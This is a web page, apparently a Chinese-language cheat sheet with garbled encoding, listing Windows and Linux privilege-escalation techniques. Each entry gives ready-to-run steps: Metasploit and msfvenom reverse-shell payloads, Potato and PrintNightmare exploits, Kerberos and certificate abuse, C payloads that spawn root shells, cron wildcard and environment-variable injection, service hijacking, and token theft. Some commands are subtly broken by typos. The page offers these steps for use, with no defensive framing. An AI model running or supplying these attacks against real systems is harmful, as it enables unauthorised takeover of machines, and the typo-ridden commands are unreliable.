<h3 id="ms14-058"><a href="#ms14-058" class="headerlink" title="ms14_058"></a>ms14_058</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ul>
<li><code>msf &gt; use exploit/windows/local/ms14_058_track_popup_menu</code></li>
<li><code>msf exploit(ms14_058_track_popup_menu) &gt; set TARGET &lt; target-id &gt;</code></li>
<li><code>msf exploit(ms14_058_track_popup_menu) &gt; exploit</code></li>
</ul>
<h3 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ol>
<li>å‘½ä»¤æç¤ºç¬¦ä¸‹: <code>powershell.exe -nop -ep bypass</code></li>
<li>åœ¨Power Shellæç¤ºç¬¦ç±»å‹è¾“å…¥: <code>Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1</code></li>
<li>åœ¨Power Shellæç¤ºç¬¦ç±»å‹è¾“å…¥: <code>Invoke-Tater -Trigger 1 -Command â€œnet localgroup administrators user /addâ€</code></li>
<li>è¦ç¡®è®¤æ”»å‡»æ˜¯å¦æˆåŠŸï¼Œè¯·åœ¨ Power Shell æç¤ºç¬¦ä¸­é”®å…¥: <code>net localgroup administrators</code></li>
</ol>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/Kevin-Robertson/Tater">https://github.com/Kevin-Robertson/Tater</a></p>
<h3 id="Intel-SYSRET"><a href="#Intel-SYSRET" class="headerlink" title="Intel SYSRET"></a>Intel SYSRET</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>execute -H -f sysret.exe -a &quot;-pid [pid]&quot;</code></li>
</ol>
<p>æ‰¹æ³¨ï¼š<a href="https://github.com/jajp777/sysret">https://github.com/jajp777/sysret</a></p>
<p>releaseç‰ˆæœ¬ï¼š<a href="https://github.com/jajp777/sysret/tree/master/x64/Release">https://github.com/jajp777/sysret/tree/master/x64/Release</a></p>
<h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;outflanknl&#x2F;PrintNightmare<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li><code>PrintNightmare 10.10.10.10 exp.dll</code></li>
</ol>
<h3 id="Folina"><a href="#Folina" class="headerlink" title="Folina"></a>Folina</h3><p>åŸŸå: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;JohnHammond&#x2F;msdt-follina<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li><code>python3 follina.py -c &quot;notepad&quot;</code></li>
</ol>
<h3 id="ALPC"><a href="#ALPC" class="headerlink" title="ALPC"></a>ALPC</h3><p>åŸŸå: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;riparino&#x2F;Task_Scheduler_ALPC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="RemotePotato0"><a href="#RemotePotato0" class="headerlink" title="RemotePotato0"></a>RemotePotato0</h3><p>åŸŸå: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>sudo ntlmrelayx.py -t ldap://10.0.0.10 â€“no-wcf-server â€“escalate-user normal_user</code></li>
<li><code>.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1</code></li>
</ol>
<p>æ‰¹æ³¨ï¼š</p>
<p>ntlmrelayx.pyåªæ‰¾åˆ°ä¸ªå¾ˆç›¸ä¼¼çš„ï¼š<a href="https://github.com/LuemmelSec/ntlmrelayx.py_to_exe">https://github.com/LuemmelSec/ntlmrelayx.py_to_exe</a></p>
<p>remotepotatoï¼š<a href="https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2">https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2</a></p>
<h3 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h3><p>åŸŸå: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>certipy req â€˜lab.local/cve$:CVEPassword1234*@10.100.10.13â€™ -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA</code></li>
<li><code>Rubeus.exe asktgt /user:&quot;ç›®æ ‡_samåç§°&quot; /certificate:cert.pfx /password:&quot;CERTIFICATE_PASSWORD&quot; /domain:&quot;FQDN_åŸŸå&quot; /dc:&quot;åŸŸå_CONTROLLER&quot; /show</code></li>
</ol>
<p>æ‰¹æ³¨ï¼š</p>
<p>rubeusï¼š<a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>åŸŸå: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  0&#x2F;1 Exploit</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc</code></li>
</ol>
<p>æ‰¹æ³¨ï¼š</p>
<p>æ— pyç‰ˆæœ¬ï¼Œexeç‰ˆæœ¬ï¼š<a href="https://github.com/ianxtianxt/MS14-068">https://github.com/ianxtianxt/MS14-068</a></p>
<h3 id="Sudo-LD-PRELOAD"><a href="#Sudo-LD-PRELOAD" class="headerlink" title="Sudo LD_PRELOAD"></a>Sudo LD_PRELOAD</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Injection</p>
<p>æ–¹æ³•: </p>
<p>1. </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">unsetenv</span><span class="token punctuation">(</span>â€œLD_PRELOADâ€<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span>â€œ<span class="token operator">/</span>bin<span class="token operator">/</span>bashâ€<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li><code>gcc -fPIC -shared -o /tmp/ldreload.so ldreload.c -nostartfiles</code></li>
<li><code>sudo LD_RELOAD=tmp/ldreload.so apache2</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-â€“-so-injection"><a href="#Abusing-File-Permission-via-SUID-Binaries-â€“-so-injection" class="headerlink" title="Abusing File Permission via SUID Binaries â€“ .so injection)"></a>Abusing File Permission via SUID Binaries â€“ .so injection)</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Injection</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>mkdir /home/user/.config</code></li>
<li></li>
</ol>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> _attribute <span class="token function">_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

 <span class="token function">system</span><span class="token punctuation">(</span>â€œcp <span class="token operator">/</span>bin<span class="token operator">/</span>bash <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">&amp;&amp;</span> chmod <span class="token operator">+</span>s <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">&amp;&amp;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">-</span>pâ€<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li><code>gcc -shared -o /home/user/.config/libcalc.so -fPIC/home/user/.config/libcalc.c</code></li>
<li><code>/usr/local/bin/suid-so</code></li>
</ol>
<p>â€‹	<code>id</code></p>
<h3 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Injection</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>RemoteDLLInjector64</code></li>
</ol>
<p>â€‹		Or</p>
<p>â€‹	<code>MemJect</code></p>
<p>â€‹		Or</p>
<p>â€‹	<code>https://github.com/tomcarver16/BOF-DLL-Inject</code></p>
<ol>
<li><code>#define PROCESS_NAME &quot;csgo.exe&quot;</code></li>
</ol>
<p>â€‹		Or</p>
<p>â€‹	<code>RemoteDLLInjector64.exe pid C:\runforpriv.dll</code></p>
<p>â€‹		Or</p>
<p>â€‹	<code>mandllinjection ./runforpriv.dll pid</code></p>
<p>æ‰¹æ³¨ï¼š</p>
<p>remoteDllInjectorï¼š<a href="https://github.com/Al1ex/RemoteDLLInjector">https://github.com/Al1ex/RemoteDLLInjector</a></p>
<p>memjectï¼š<a href="https://github.com/danielkrupinski/MemJect">https://github.com/danielkrupinski/MemJect</a></p>
<h3 id="Early-Bird-Injection"><a href="#Early-Bird-Injection" class="headerlink" title="Early Bird Injection"></a>Early Bird Injection</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Injection</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">hollow svchost.exe pop.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼šhollowé“¾æ¥<a href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing</a></p>
<h3 id="Process-Injection-through-Memory-Section"><a href="#Process-Injection-through-Memory-Section" class="headerlink" title="Process Injection through Memory Section"></a>Process Injection through Memory Section</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Injection</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>sec-shinject PID /path/to/bin</code></li>
</ol>
<p>æ‰¹æ³¨ï¼šæœªæ‰¾åˆ°</p>
<h3 id="Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite"><a href="#Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite" class="headerlink" title="Abusing Scheduled Tasks via Cron Path Overwrite"></a>Abusing Scheduled Tasks via Cron Path Overwrite</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Abusing Scheduled Tasks</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; systemupdate.sh;</code></li>
<li><code>chmod +x systemupdate.sh</code></li>
<li><code>ç­‰å¾…ä¸€ä¼šå„¿</code></li>
<li><code>/tmp/bash -p</code></li>
<li><code>id &amp;&amp; whoami</code></li>
</ol>
<h3 id="Abusing-Scheduled-Tasks-via-Cron-Wildcards"><a href="#Abusing-Scheduled-Tasks-via-Cron-Wildcards" class="headerlink" title="Abusing Scheduled Tasks via Cron Wildcards"></a>Abusing Scheduled Tasks via Cron Wildcards</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Abusing Scheduled Tasks</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; /home/user/systemupdate.sh;</code></li>
<li><code>touch /home/user/ â€“checkpoint=1;</code></li>
<li><code>touch /home/user/ â€“checkpoint-action=exec=sh\systemupdate.sh</code></li>
<li><code>ç­‰å¾…ä¸€ä¼šå„¿</code></li>
<li><code>/tmp/bash -p</code></li>
<li><code>id &amp;&amp; whoami</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-â€“-Symlink"><a href="#Abusing-File-Permission-via-SUID-Binaries-â€“-Symlink" class="headerlink" title="Abusing File Permission via SUID Binaries â€“ Symlink)"></a>Abusing File Permission via SUID Binaries â€“ Symlink)</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Abusing File Permission</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>su â€“ www-data;</code></li>
<li><code>nginxed-root.sh /var/log/nginx/error.log;</code></li>
<li>In root user</li>
<li><code>invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-â€“-Environment-Variables-1"><a href="#Abusing-File-Permission-via-SUID-Binaries-â€“-Environment-Variables-1" class="headerlink" title="Abusing File Permission via SUID Binaries â€“ Environment Variables #1)"></a>Abusing File Permission via SUID Binaries â€“ Environment Variables #1)</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Abusing File Permission</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>echo &#39;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#39; &gt;/tmp/service.c;</code></li>
<li><code>gcc /tmp/services.c -o /tmp/service;</code></li>
<li><code>export PATH=/tmp:$PATH;</code></li>
<li><code>/usr/local/bin/sudi-env; id</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-â€“-Environment-Variables-2"><a href="#Abusing-File-Permission-via-SUID-Binaries-â€“-Environment-Variables-2" class="headerlink" title="Abusing File Permission via SUID Binaries â€“ Environment Variables #2)"></a>Abusing File Permission via SUID Binaries â€“ Environment Variables #2)</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Abusing File Permission</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp &amp;&amp; chown root.root /tmp/bash &amp;&amp; chmod +S /tmp/bash)&#39; /bin/sh -c /usr/local/bin/suid-env2; set +x; /tmp/bash -p</code></li>
</ol>
<h3 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>Windows_dll.c: cmd.exe /k net localgroup administrators user /add</code></li>
<li><code>x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll</code></li>
<li><code>sc stop dllsvc &amp; sc start dllsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-binPath"><a href="#Abusing-Services-via-binPath" class="headerlink" title="Abusing Services via binPath"></a>Abusing Services via binPath</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>sc config daclsvc binpath= &quot;net localgroup administrators user /add&quot;</code></li>
<li><code>sc start daclsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Unquoted-Path"><a href="#Abusing-Services-via-Unquoted-Path" class="headerlink" title="Abusing Services via Unquoted Path"></a>Abusing Services via Unquoted Path</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>msfvenom -p windows/exec CMD=â€™net localgroup administrators user /addâ€™ -f exe-service -o common.exe</code></li>
<li><code>common.exe æ”¾åœ¨ &#39;C:\Program Files\Unquoted Path Service&#39;.</code></li>
<li><code>sc start unquotedsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Registry"><a href="#Abusing-Services-via-Registry" class="headerlink" title="Abusing Services via Registry"></a>Abusing Services via Registry</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t</code></li>
<li><code>REG_EXPAND_SZ /d c:\temp\x.exe /f</code></li>
<li><code>sc start regsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Executable-File"><a href="#Abusing-Services-via-Executable-File" class="headerlink" title="Abusing Services via Executable File"></a>Abusing Services via Executable File</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>copy /y c:\Temp\x.exe &quot;c:\Program Files\File Permissions Service\filepermservice.exe&quot;</code></li>
<li><code>sc start filepermsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Autorun"><a href="#Abusing-Services-via-Autorun" class="headerlink" title="Abusing Services via Autorun"></a>Abusing Services via Autorun</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) ç±»å‹ï¼š <code>use multi/handler</code></p>
<p>In Metasploit (msf &gt; prompt) ç±»å‹ï¼š <code>set payload windows/meterpreter/reverse_tcp</code></p>
<p>In Metasploit (msf &gt; prompt) ç±»å‹ï¼š <code>set lhost [Kali VM IP Address]</code></p>
<p>In Metasploit (msf &gt; prompt) ç±»å‹ï¼š <code>run</code></p>
<p>æ‰“å¼€å¦ä¸€ä¸ªå‘½ä»¤æç¤ºç¬¦å¹¶é”®å…¥:</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;[Kali VM IP Address] -f exe -o program.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">program.exe æ”¾åœ¨ &#39;C:\Program Files\Autorun Program&#39;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-Services-via-AlwaysInstallElevated"><a href="#Abusing-Services-via-AlwaysInstallElevated" class="headerlink" title="Abusing Services via AlwaysInstallElevated"></a>Abusing Services via AlwaysInstallElevated</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;exec CMD&#x3D;&#39;net localgroup administrators user &#x2F;add&#39; -f msi-nouac -o setup.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\Temp\setup.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼šsharpupé“¾æ¥<a href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p>
<h3 id="Abusing-Services-via-SeCreateToken"><a href="#Abusing-Services-via-SeCreateToken" class="headerlink" title="Abusing Services via SeCreateToken"></a>Abusing Services via SeCreateToken</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">!rmpriv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-Services-via-SeDebug"><a href="#Abusing-Services-via-SeDebug" class="headerlink" title="Abusing Services via SeDebug"></a>Abusing Services via SeDebug</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Conjure-LSASS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">syscall_enable_priv 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Remote-Process-via-Syscalls-HellsGate-Halæ“ä½œç³»ç»ŸGate"><a href="#Remote-Process-via-Syscalls-HellsGate-Halæ“ä½œç³»ç»ŸGate" class="headerlink" title="Remote Process via Syscalls (HellsGate|Halæ“ä½œç³»ç»ŸGate)"></a>Remote Process via Syscalls (HellsGate|Halæ“ä½œç³»ç»ŸGate)</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">injectEtwBypass pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/boku7/injectEtwBypass">https://github.com/boku7/injectEtwBypass</a></p>
<h3 id="Escalate-With-DuplicateTokenEx"><a href="#Escalate-With-DuplicateTokenEx" class="headerlink" title="Escalate With DuplicateTokenEx"></a>Escalate With DuplicateTokenEx</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹: Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<pre class="line-numbers language-none"><code class="language-none">PrimaryTokenTheft.exe pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">TokenPlaye.exe â€“impersonate â€“pid pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š</p>
<p>primarytokenthenftï¼š<a href="https://github.com/slyd0g/PrimaryTokenTheft">https://github.com/slyd0g/PrimaryTokenTheft</a></p>
<p>tokenplayeï¼š<a href="https://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8">https://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8</a></p>
<h3 id="Abusing-Services-via-SeIncreaseBasePriority"><a href="#Abusing-Services-via-SeIncreaseBasePriority" class="headerlink" title="Abusing Services via SeIncreaseBasePriority"></a>Abusing Services via SeIncreaseBasePriority</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">start &#x2F;realtime SomeCpuIntensiveApp.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š</p>
<p>æ‰¾äº†ä¸€åœˆï¼Œåªæœ‰è¿™å„¿æœ‰ç›¸å…³å†…å®¹ï¼š<a href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></p>
<h3 id="Abusing-Services-via-SeManageVolume"><a href="#Abusing-Services-via-SeManageVolume" class="headerlink" title="Abusing Services via SeManageVolume"></a>Abusing Services via SeManageVolume</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">åªéœ€ç¼–è¯‘å¹¶è¿è¡ŒSeManageVolumeAbuse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/xct/SeManageVolumeAbuse">https://github.com/xct/SeManageVolumeAbuse</a></p>
<h3 id="Abusing-Services-via-SeRelabel"><a href="#Abusing-Services-via-SeRelabel" class="headerlink" title="Abusing Services via SeRelabel"></a>Abusing Services via SeRelabel</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">WRITE_OWNERå¯¹èµ„æºçš„è®¿é—®æƒé™ï¼ŒåŒ…æ‹¬æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Run for privilege escalation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-Services-via-SeRestore"><a href="#Abusing-Services-via-SeRestore" class="headerlink" title="Abusing Services via SeRestore"></a>Abusing Services via SeRestore</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>å¯åŠ¨å…·æœ‰ SeRestore æƒé™çš„ PowerShell/ISE</code>.</li>
<li><code>ä½¿ç”¨Enable-SeRestorePrivilege å¯ç”¨æƒé™</code>.</li>
<li><code>å°†utilman.exeé‡å‘½åä¸ºutilman.old</code></li>
<li><code>å°†cmd.exeé‡å‘½åä¸ºutilman.exe</code></li>
<li><code>é”å®šæ§åˆ¶å°å¹¶æŒ‰Win+U</code></li>
</ol>
